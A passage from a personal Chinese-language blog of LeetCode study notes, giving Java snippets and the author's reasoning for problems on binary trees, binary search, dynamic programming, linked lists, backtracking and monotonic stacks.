class="code"><pre><span class="line"><span class="number">1.</span>我的想法，栈实现二叉树中序遍历。这是经典代码，带没想到这么快就忘了呜呜呜</span><br><span class="line"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">        Deque&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>||!stack.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur = cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            result.add(node.val);</span><br><span class="line">            cur = node.right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="101、对称二叉树（10月6日）"><a href="#101、对称二叉树（10月6日）" class="headerlink" title="101、对称二叉树（10月6日）"></a>101、对称二叉树（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归。判断二叉树是否对称需要看<span class="number">3</span>点：</span><br><span class="line">a.左树根节点的值 == 右树根节点的值；</span><br><span class="line">b.左树的左子树 和 右树的右子树 对称；</span><br><span class="line">c.左树的右子树 和 右数的左子树 对称；</span><br><span class="line">其中，b和c两点就是递归点，设计比较左子树和右子树的递归函数即可，此外再考虑特殊情况。</span><br></pre></td></tr></table></figure><h2 id="102、二叉树的层序遍历（10月6日）"><a href="#102、二叉树的层序遍历（10月6日）" class="headerlink" title="102、二叉树的层序遍历（10月6日）"></a>102、二叉树的层序遍历（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，我的想法，队列实现二叉树广度优先遍历。这是经典代码，记住要维护每层的长度len即可</span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; results = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;TreeNode&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> queue.size();</span><br><span class="line">            <span class="keyword">while</span>(len&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> queue.pop();</span><br><span class="line">                result.add(node.val);</span><br><span class="line">                len -= <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(node.left!=<span class="literal">null</span>)</span><br><span class="line">                    queue.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right!=<span class="literal">null</span>)</span><br><span class="line">                    queue.offer(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            results.add(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="104、二叉树的最大深度（10月6日）"><a href="#104、二叉树的最大深度（10月6日）" class="headerlink" title="104、二叉树的最大深度（10月6日）"></a>104、二叉树的最大深度（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，递归。递归函数设计如下，每个节点和根节点一样，都向左子树和右子树深度优先遍历，并记录当前深度，当遇到左子树或右子树为空时，通过Math.max更新当前最大深度。</span><br><span class="line">     dfs(TreeNode root,<span class="type">int</span>[] maxDeep,<span class="type">int</span> deep)</span><br></pre></td></tr></table></figure><h2 id="105、从前序与中序遍历序列构造二叉树（10月7日）"><a href="#105、从前序与中序遍历序列构造二叉树（10月7日）" class="headerlink" title="105、从前序与中序遍历序列构造二叉树（10月7日）"></a>105、从前序与中序遍历序列构造二叉树（10月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，递归。这道题想起来是很困难的，核心点是，因为题目说明元素不相同，前序遍历首先会访问根节点，再到中序遍历中寻找根节点，则中序遍历根节点左侧为左子树，中序遍历根节点右侧为右子树。如</span><br><span class="line">    前序遍历：[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]    中序遍历：[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>] -&gt; [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>] <span class="number">0</span> [<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    也可以看到：左子树长度等于 <span class="number">3</span>-<span class="number">0</span>=<span class="number">3</span>，这时候前序遍历左子树索引范围[<span class="number">0</span>+<span class="number">1</span>,<span class="number">0</span>+<span class="number">3</span>]，右子树索引范围为[<span class="number">0</span>+<span class="number">3</span>+<span class="number">1</span>,<span class="number">5</span>]；</span><br><span class="line">    <span class="comment">//表示从ininorder_start开始，不包含inorder_index的串长度</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">preorder_len</span> <span class="operator">=</span> inorder_index - inorder_start;</span><br><span class="line">    <span class="comment">//后面4个int变量，分别是前序、后续遍历的索引起始范围，都是可以渠道的</span></span><br><span class="line">    root.left = dfs(preorder,hashMap,preorder_start+<span class="number">1</span>,preorder_start+preorder_len,inorder_start,inorder_index-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">因为preorder_len是根据中序遍历计算的，不懂，下次再做吧</span><br></pre></td></tr></table></figure><h2 id="121、买卖股票的最佳时机（10月6日）"><a href="#121、买卖股票的最佳时机（10月6日）" class="headerlink" title="121、买卖股票的最佳时机（10月6日）"></a>121、买卖股票的最佳时机（10月6日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，左指针。双层<span class="keyword">for</span>循环会超过时间限制，因此维护一个指向当前最小元素的指针。从左到右遍历时，如果当前元素小于左指针指向的元素，就更新左指针；如果当前元素大于左指针指向的元素，就通过Math.max更新最大利润。</span><br></pre></td></tr></table></figure><h2 id="136、只出现一次的数字（10月7日）"><a href="#136、只出现一次的数字（10月7日）" class="headerlink" title="136、只出现一次的数字（10月7日）"></a>136、只出现一次的数字（10月7日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，HashSet。从左到右遍历数组，如果当前数组元素不在hashSet中，将数组元素放入hashSet；存在则移除该数组元素，最终hashSet仅存的元素就是该数字。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，按位异或。因为其他数字都出现两次，^为异或，a^a=<span class="number">0</span>，<span class="number">0</span>^a=a，</span><br><span class="line">    且异或满足交换律和结合律：a^b^c=(a^b)^c=a^(b^c)=(a^c)^b</span><br><span class="line">    设result初值为<span class="number">0</span>，故从左到右遍历，通过result ^= num更新result，结果只剩唯一值。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>，按位累加运算。维护一个大小为<span class="number">32</span>的数组bitNums，表示一个整数的每一位，通过bitNums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;累加得到所有数字的和，再通过<span class="keyword">for</span>(<span class="number">32</span>)中的result = (result&lt;&lt;<span class="number">1</span>)+bitNums[i]%<span class="number">2</span>;得到那唯一的数字；</span><br><span class="line">    bitNums[i] += (num&gt;&gt;(<span class="number">31</span>-i))&amp;<span class="number">1</span>;    <span class="comment">//仅保留最后一位，因为1的前面位置全为0</span></span><br><span class="line"> result = (result&lt;&lt;<span class="number">1</span>)+bitNums[i]%<span class="number">2</span>;    <span class="comment">//不断左移，在末尾加上低位</span></span><br><span class="line"><span class="number">2.</span>HashSet遍历的两种方式：</span><br><span class="line">    a.迭代器</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> set.iterator();  </span><br><span class="line">    <span class="keyword">while</span> (iterator.hasNext()) &#123;  </span><br><span class="line">        System.out.println(iterator.next());              </span><br><span class="line">    &#125;</span><br><span class="line">b.直接遍历</span><br><span class="line">    <span class="keyword">for</span> (String s:set) &#123;  </span><br><span class="line"> System.out.println(s);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="34、在排序数组中查找元素的第一个和最后一个位置（10月8日）"><a href="#34、在排序数组中查找元素的第一个和最后一个位置（10月8日）" class="headerlink" title="34、在排序数组中查找元素的第一个和最后一个位置（10月8日）"></a>34、在排序数组中查找元素的第一个和最后一个位置（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>师爷，翻译翻译，什么叫TMD、TMD非递减？</span><br><span class="line">  好嘞，意思是关键字递增序排列，但是并非单调递增（因为有重复的关键字）从小到大或者允许中间有相等的情形。</span><br><span class="line"><span class="number">2.</span>我的想法，二分查找。由于是递增但是非单调的序列，故能使用二分查找。首先用二分查找确定nums中等于target的一个数的位置，再以该数为起点，确定相同值的最小索引和最大索引。本题从二分查找出发很好想，下面是二分查找经典代码（left、right指针）：</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>,right = nums.length-<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">targetIndex</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left&lt;=right)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid]&lt;target)&#123;</span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]&gt;target)&#123;</span><br><span class="line">            right = mid-<span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            targetIndex = mid;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="49、字母异位词分组（10月8日）"><a href="#49、字母异位词分组（10月8日）" class="headerlink" title="49、字母异位词分组（10月8日）"></a>49、字母异位词分组（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，hashMap。这道题以前做过，又忘了。核心是维护一个HashMap&lt;String,List&lt;String&gt;&gt;，key为Arrays.sort(strArray)排序好的字符串，这样“tea”、“ate”、“eat”的key都为“aet”，就能放到value的列表中储存。</span><br></pre></td></tr></table></figure><h2 id="53、最大子数组和（10月8日）"><a href="#53、最大子数组和（10月8日）" class="headerlink" title="53、最大子数组和（10月8日）"></a>53、最大子数组和（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>子序列可以不连续，连续必然是子序列。</span><br><span class="line"><span class="number">2.</span>我的想法，滑动窗口。使用双层<span class="keyword">for</span>循环，外层确定窗口大小len，内层从左到右遍历，并通过Math.max更新窗口的最大sum。但是，这会导致O(n^<span class="number">2</span>)的复杂度，在最后的测试用例上出现超时。</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，动态规划。动态规划的关键在于：如何定义状态？（如何定义子问题？）</span><br><span class="line">题解中的思路转变是这样，子问题这样定义：[-<span class="number">2</span>,<span class="number">1</span>,-<span class="number">3</span>,<span class="number">4</span>,-<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,-<span class="number">5</span>,<span class="number">4</span>]</span><br><span class="line">    经过-<span class="number">2</span>的连续子数组的最大和是多少？</span><br><span class="line">    经过<span class="number">1</span>的连续子数组的最大和是多少？  ...</span><br><span class="line">但是这样定义，子问题之间很难看出联系，这说明子问题的描述不够准确，转换为：</span><br><span class="line">    以-<span class="number">2</span>结尾的连续子数组的最大和是多少？</span><br><span class="line">    以<span class="number">1</span>结尾的连续子数组的最大和是多少？  ...</span><br><span class="line">这时候子问题就产生了联系，状态转移方程如下：</span><br><span class="line">当dp[i-<span class="number">1</span>]&lt;<span class="number">0</span>时，dp[i]=nums[i];</span><br><span class="line">当dp[i-<span class="number">1</span>]&gt;<span class="number">0</span>时，dp[i] = dp[i-<span class="number">1</span>]+nums[i];</span><br><span class="line">从左到右求解状态转移方程，并找出dp[i]中的最大值，即可解本题。</span><br><span class="line"><span class="number">3.</span>第一次正面认识动态规划，记录两点收获：</span><br><span class="line">    a.动态规划中状态的定义和题目中问题的定义并不相等，求解完状态再分析才能解出题目；</span><br><span class="line">    b.动态规划中子问题（状态）的定义需要有无后效性，后面求解的子问题不再影响前面解出的结果；</span><br></pre></td></tr></table></figure><h2 id="124、二叉树的最大路径和（10月8日）"><a href="#124、二叉树的最大路径和（10月8日）" class="headerlink" title="124、二叉树的最大路径和（10月8日）"></a>124、二叉树的最大路径和（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，深度优先搜索。这道题以前做得很痛苦，这次看到了关键的提示root.val+max(left,right)，还是比较轻松做出来了。对于每个节点，它负责的是：</span><br><span class="line">a.在该节点更新最大值maxValue，考虑：root.val，root.val+left，root.val+right，root.val+left+right四种情况，为了使代码更加优雅，可以用<span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> Math.max(<span class="number">0</span>,dfs(root.left,maxSumLeft));</span><br><span class="line">b。向上层返回root.val+max(left,right)；</span><br></pre></td></tr></table></figure><h2 id="300、最长上升子序列（10月8日）"><a href="#300、最长上升子序列（10月8日）" class="headerlink" title="300、最长上升子序列（10月8日）"></a>300、最长上升子序列（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。感觉这种子数组、子序列问题，就要将子问题设置为：</span><br><span class="line"><span class="comment">//状态：以i结尾的最长递增子序列</span></span><br><span class="line">用双层<span class="keyword">for</span>循环做，外层确定当前状态，内层确定[<span class="number">0</span>,当前状态-<span class="number">1</span>]对当前状态的影响，状态转移方程为：</span><br><span class="line">     dp[i] = max(dp[<span class="number">0</span>],dp[<span class="number">1</span>],...,dp[i-<span class="number">1</span>])+<span class="number">1</span>;  <span class="comment">//其中，max中的dp[j]需满足nums[当前]&gt;nums[j]</span></span><br><span class="line">找到最大的dp即为题解。</span><br></pre></td></tr></table></figure><h2 id="347、前K个高频元素（10月8日）"><a href="#347、前K个高频元素（10月8日）" class="headerlink" title="347、前K个高频元素（10月8日）"></a>347、前K个高频元素（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>PriorityQueue默认是最小堆，即Comparator为(e1,e2)-&gt;&#123;e1-e2&#125;，元素按照升序排列；</span><br><span class="line">    如果要降序排列，则比较器的顺序为(e1,e2)-&gt;&#123;e2-e1&#125;，降序排列队列头部为最大值。</span><br><span class="line"><span class="number">2.</span>我的想法，hashMap+PriorityQueue。维护一个hashMap&lt;数字，次数&gt;，将hashMap的键值对放入PriorityQueue根据值维护的最小堆，注意最小堆大小超过k时，要先放入新键值，再剔除堆顶。</span><br><span class="line">    PriorityQueue&lt;Map.Entry&lt;Integer,Integer&gt;&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((e1,e2)-&gt;(e1.getValue()-e2.getValue()));</span><br></pre></td></tr></table></figure><h2 id="32、最长有效括号（10月8日）"><a href="#32、最长有效括号（10月8日）" class="headerlink" title="32、最长有效括号（10月8日）"></a>32、最长有效括号（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。设置子问题为，以当前字符结尾的有小括号子串长度。</span><br><span class="line">当前字符为<span class="string">&#x27;(&#x27;</span>时，dp[i]=<span class="number">0</span>；</span><br><span class="line">当前字符为<span class="string">&#x27;)&#x27;</span>时，</span><br><span class="line">    a.如果前一字符为<span class="string">&#x27;(&#x27;</span>则将dp[i]初值设为<span class="number">2</span>，并循环累加<span class="number">2</span>个字符前有效<span class="string">&#x27;)&#x27;</span>的dp；</span><br><span class="line">    b.如果前一字符为<span class="string">&#x27;)&#x27;</span>，则dp[i] = dp[i-<span class="number">1</span>]+<span class="number">2</span>；如果(i-<span class="number">1</span>)的串再加补全<span class="string">&#x27;(&#x27;</span>前还是有效<span class="string">&#x27;)&#x27;</span>,则：</span><br><span class="line">    dp[i] = dp[i-<span class="number">1</span>]+<span class="number">2</span>+dp[i-<span class="number">2</span>-dp[i-<span class="number">1</span>]];</span><br><span class="line">    但是，没有考虑完整情况。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，动态规划。本以为又会耗费很多时间，一看题解发现和我考虑的情况一致，就是我外加了上述的循环累加，修改为<span class="keyword">if</span>即通过。</span><br><span class="line">    Q：为什么循环累加不行？</span><br><span class="line">    A：上面b情况，考虑的是<span class="string">&quot;...))&quot;</span>，靠前面的<span class="string">&#x27;(&#x27;</span>补全当前<span class="string">&#x27;)&#x27;</span>后，如果此前还位有效<span class="string">&#x27;)&#x27;</span>，则应该再加上其dp；</span><br><span class="line">       上面a情况，考虑的是<span class="string">&quot;...()&quot;</span>，写<span class="keyword">while</span>循环考虑的是<span class="string">&quot;...)()&quot;</span>，其中前面的<span class="string">&#x27;)&#x27;</span>有效，应该不断向前循环累加有效<span class="string">&#x27;)&#x27;</span>的dp，但这是不对的，不必要再循环，更前面的有效<span class="string">&#x27;)&#x27;</span>已经在先遇到的<span class="string">&#x27;)&#x27;</span>dp所包含。</span><br><span class="line">    总而言之，非常非常接近答案，但是长时间的思考愈发理不清前面的状态，甚至可以向，dp中本来就不应该有<span class="keyword">while</span>。</span><br><span class="line">    简介，前面为(，再考虑一层；前面为)，再考虑两层。</span><br></pre></td></tr></table></figure><h2 id="206、反转链表（10月8日）"><a href="#206、反转链表（10月8日）" class="headerlink" title="206、反转链表（10月8日）"></a>206、反转链表（10月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，迭代法三指针。反转链表迭代法，就是要维护pre，cur和after三枚指针，最开始将cur指向head.next，pre指向head，pre.next指向<span class="literal">null</span>，通过以下方式更新链表：</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">after</span> <span class="operator">=</span> cur.next;</span><br><span class="line">        cur.next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = after;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">这种方式的坏处是，如果head指向<span class="literal">null</span>，就需要额外的判断，所以初值设置应该为：</span><br><span class="line">    cur指向head，pre指向<span class="literal">null</span>。</span><br></pre></td></tr></table></figure><h2 id="114、二叉树展开为链表（10月9日）"><a href="#114、二叉树展开为链表（10月9日）" class="headerlink" title="114、二叉树展开为链表（10月9日）"></a>114、二叉树展开为链表（10月9日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>经典的栈实现二叉树前序遍历</span><br><span class="line">    Deque&lt;TreeNode&gt; stack= <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    List&lt;TreeNode&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span>||!stack.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//访问cur.val</span></span><br><span class="line">            list.add(cur);</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        cur = cur.right;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>我的想法，二叉树前序遍历。经典的二叉树前序遍历代码，不断遍历left指针，遇到<span class="literal">null</span>时弹栈，获取最近的right指针，再进行相同操作。没啥可说的，list中是前序遍历结果，通过perv、curr指针从<span class="number">1</span>遍历完即可。不用考虑末尾的双<span class="literal">null</span>，因为在原链表该节点也是双<span class="literal">null</span>。这样空间复杂度是O(n)，不是O(<span class="number">1</span>)。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>，空间复杂度为O(<span class="number">1</span>)的方法。涉及到指针这种引用类型，很多转引用、存储后的操作是不能保护值的，这在做这些题的时候要注意。题解的思想很简单，就是通过cur的left指针不为空时，就尽可能沿着right方向遍历cur.left节点，并将cur.right接在cur.left.right的最底层。因为对左子树来说，也是最右边的节点被最后访问，把root节点的右子树接在左子树最右边的底层是合理的。</span><br></pre></td></tr></table></figure><h2 id="31、下一个排列（10月10日）"><a href="#31、下一个排列（10月10日）" class="headerlink" title="31、下一个排列（10月10日）"></a>31、下一个排列（10月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，两次遍历。寻找下一个排列，本质是从后向前扫描时，要找到顺序对满足a[i]&lt;a[i+<span class="number">1</span>]，这时候从[i+<span class="number">1</span>,len-<span class="number">1</span>]范围内从后向前找到a[j]满足a[j]&gt;a[i]，因为此时[i+<span class="number">1</span>,len-<span class="number">1</span>]都不存在顺序对，故a[j]恰比a[i]大。替换a[i]和a[j]后，将[i+<span class="number">1</span>,len-<span class="number">1</span>]按顺序排列。</span><br><span class="line">    如“<span class="number">652341</span>”，第一个顺序对是“<span class="number">34</span>”，a[i]=<span class="number">3</span>，a[j]=<span class="number">4</span>，此时下一个排列是“<span class="number">652413</span>”，前面的<span class="number">2</span>不会替换<span class="number">3</span>，因为高位压阵，恰下一个；</span><br><span class="line">    如“<span class="number">652431</span>”，第一个顺序对是“<span class="number">24</span>”，a[i]=<span class="number">2</span>，a[j]=<span class="number">3</span>，此时下一个排列是“<span class="number">653124</span>”；</span><br><span class="line">    （没啥好说的，记住从后往前找顺序对，替换后在排列即可。）</span><br><span class="line"><span class="number">2.</span>实现过程，由于i+<span class="number">1</span>往后都是倒序排列，要实现顺序排列只需依次交换两端元素:</span><br><span class="line"><span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">        swap(nums,left,right);</span><br><span class="line">        left++;right--;</span><br><span class="line">    &#125;</span><br><span class="line">另外如果输入为“<span class="number">654321</span>”这种极端情况，第一次遍历结束必然i为-<span class="number">1</span>，判断此情况后，直接reverse(nums,i+<span class="number">1</span>);并返回即可。</span><br></pre></td></tr></table></figure><h2 id="33、搜索旋转排序数组（10月10日）"><a href="#33、搜索旋转排序数组（10月10日）" class="headerlink" title="33、搜索旋转排序数组（10月10日）"></a>33、搜索旋转排序数组（10月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，本来以为题意是，寻找旋转前数组中目标值的索引，先遍历找到旋转点i后，然后根据nums[<span class="number">0</span>]、nums[i]和target的大小关系，再到两段顺序序列中找到目标值索引，并根据长度恢复出旋转前索引。后来，发现题解好像就是找旋转后的索引，那一轮<span class="keyword">for</span>就搞定。但是，这时候复杂度为O(n)，不满足题意。</span><br><span class="line"><span class="number">2.</span>我的想法，二分查找。根据target和nums[<span class="number">0</span>]的关系，可以知道target出现在前一段序列or后一段序列。</span><br><span class="line">    如果出现在前一段序列，二分查找时mid&gt;=nums[<span class="number">0</span>]，说明mid也落入前一段，这时候可以按一般二分查找移动指针，否则只移动right指针到mid-<span class="number">1</span>；</span><br><span class="line">    如果出现在后一段序列，二分查找时mid&lt;nums[<span class="number">0</span>]（注意不带等于），说明mid也落入后一段，这时候可以按一般二分查找移动指针，否则只移动left指针到mid+<span class="number">1</span>；</span><br><span class="line">    （关键词，根据target和nums[<span class="number">0</span>]的关系进入不同的二分查找策略）</span><br></pre></td></tr></table></figure><h2 id="39、组合总和（10月10日）"><a href="#39、组合总和（10月10日）" class="headerlink" title="39、组合总和（10月10日）"></a>39、组合总和（10月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯。定义dfs函数如下，当sum等于目标值target时，将<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(result)添加到results中。但是，这样做得问题是会产生重复，如[<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]，[<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>]，并且想不到去重策略。</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target,<span class="type">int</span> deep,<span class="type">int</span> sum,List&lt;Integer&gt; result,List&lt;List&lt;Integer&gt;&gt; results)</span></span><br><span class="line"><span class="number">2.</span>没必要记录深度，可以在返回时用combine.remove(combine.size() - <span class="number">1</span>)清除效果。</span><br><span class="line"><span class="number">3.</span>重复的原因在，没有按照一个方向选取元素，如[<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>]，假设取完元素<span class="number">2</span>后再取元素<span class="number">3</span>，则不能折回来再取元素<span class="number">2</span>，这时候就要记录遍历的index，遇到每个元素应该选择本元素（index不增）或者跳过（index+<span class="number">1</span>）。这时多一种最终判断，就是：</span><br><span class="line">    <span class="keyword">if</span>(index==candidates.length) <span class="keyword">return</span>; <span class="comment">//否则会栈溢出</span></span><br><span class="line">(关键词，按顺序加索引，不加深度)</span><br></pre></td></tr></table></figure><h2 id="40、接雨水（10月11日）"><a href="#40、接雨水（10月11日）" class="headerlink" title="40、接雨水（10月11日）"></a>40、接雨水（10月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，来自评论区的总结，找左右两边最大值中的小者，减去本身高度。这时候在[<span class="number">1</span>,heigh.length-<span class="number">1</span>]范围内从左到右遍历，遍历到heigh[j]时，寻找它左侧、右侧最大值maxLeft、maxRight，如果都小于等于它本身则result+<span class="number">0</span>，否则result+min&#123;maxLeft,maxRight&#125;-heigh[j]。时间复杂度O(n^<span class="number">2</span>)。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，动态规划。上一种解法中，时间复杂度为O(n^<span class="number">2</span>)的原因，在于需要搜索heigh[j]左右两侧的最大值，如果已知两边最值，时间复杂度就能降到O(n)。可以维护两个数组leftMax[]、rightMax[]记录每个j两侧最值，先通过从前向后、从后向前扫描初始化这两个数组。再从左向右遍历累加结果。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>，双指针。进一步观察发现，并不需要明确知道最大值，维护两个指针left、right，left从<span class="number">0</span>开始向右移动，right从height.length - <span class="number">1</span>开始向左移动，只要：</span><br><span class="line">    a.height[left]&lt;height[right]，则必有 leftMax&lt;rightMax，此时移动left指针</span><br><span class="line">    b.height[left]≥height[right]，则必有 leftMax≥rightMax，此时移动right指针</span><br><span class="line">    这样每次只移动更小处的指针。</span><br></pre></td></tr></table></figure><h2 id="84、柱状图中的最大矩形（10月11日）"><a href="#84、柱状图中的最大矩形（10月11日）" class="headerlink" title="84、柱状图中的最大矩形（10月11日）"></a>84、柱状图中的最大矩形（10月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>来自评论区的总结，题解讲得有点复杂，不利于理解。。。说白了，这题考的基础模型其实就是：在一维数组中对每一个数找到第一个比自己小的元素。这类“在一维数组中找第一个满足某种条件的数”的场景就是典型的单调栈应用场景。</span><br><span class="line"><span class="number">2.</span>第一次遇见单调栈，思路原理是，如果新元素小于栈顶元素，就一直弹栈，直到新元素大于栈顶元素：</span><br><span class="line">此时，栈顶元素是新元素左边，比新元素小的第一个元素；</span><br><span class="line">每次弹栈时，新元素是栈顶元素右边，比栈顶元素小的第一个元素；</span><br><span class="line">这样经过一次遍历，就能找到数组中每个元素左右两边第一个比它小的元素，当然还是更关注左边。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>，单调栈。目标是计算每个高度限制的最大矩形面积，从左到右遍历高度：</span><br><span class="line"><span class="number">1.</span>假如新元素大于栈顶元素，则直接压栈，不是该高度的出场日；</span><br><span class="line"><span class="number">2.</span>假如新元素小于栈顶元素，就将栈顶元素出栈，对于这个出栈的元素A而言，</span><br><span class="line">a.新元素是A右边，比A小的第一个元素；</span><br><span class="line">b.新的栈顶元素，是A左边比A小的第一个元素；</span><br><span class="line">这样就得到了当前出栈高度左右两边的界限，从而可知当前出栈高度为上限的最大矩形面积。</span><br><span class="line">(简言之，所有面积都是出栈时候求的，因为只有出栈的元素，才会有左边界和右边界)</span><br><span class="line"><span 